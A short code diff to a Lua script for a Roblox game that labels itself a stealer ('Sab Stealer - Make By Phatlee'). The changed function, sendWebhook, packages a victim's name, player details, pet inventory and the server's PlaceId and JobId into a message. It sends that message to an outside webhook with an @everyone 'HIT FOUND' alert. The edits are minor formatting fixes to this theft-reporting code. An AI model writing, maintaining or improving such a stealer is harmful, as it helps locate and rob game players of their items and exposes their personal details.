@@ -165,7 +165,7 @@ local function sendWebhook(link)
     for _, r in ipairs(randomPets) do
         table.insert(orderedPets, r)
     end
-    
+
     local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
@@ -174,7 +174,7 @@ local function sendWebhook(link)
         ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
-            { ["name"] = "Players", ["value"] = string.format("%d/8", #game:GetService("Players"):GetPlayers()) },
+            { ["name"] = "Players", ["value"] = string.format("%d/6", #game:GetService("Players"):GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
@@ -186,7 +186,7 @@ local function sendWebhook(link)
         }
     }
     local payload = {
-    ["content"] = "đŸ“£ @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
+    ["content"] = "📣 @everyone **HIT FOUND!!!!!**\n" .. (link or ("Server detected: " .. serverType)),
     ["embeds"] = {embed},
     ["allowed_mentions"] = {
         ["parse"] = {"everyone"}
